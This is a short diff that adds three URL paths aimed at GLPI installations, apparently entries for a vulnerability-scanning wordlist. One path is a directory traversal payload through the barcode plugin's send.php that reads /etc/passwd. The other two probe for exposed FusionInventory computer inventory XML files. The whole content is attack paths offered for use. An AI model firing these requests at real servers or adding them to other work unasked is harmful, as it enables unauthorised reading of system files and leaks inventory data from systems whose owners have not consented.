@@ -1,0 +1,3 @@
+/glpi/plugins/barcode/front/send.php?file=../../../../../../../../etc/passwd
+/files/_plugins/fusioninventory/xml/computer/1/10.xml
+/glpi/files/_plugins/fusioninventory/xml/computer/1/10.xml
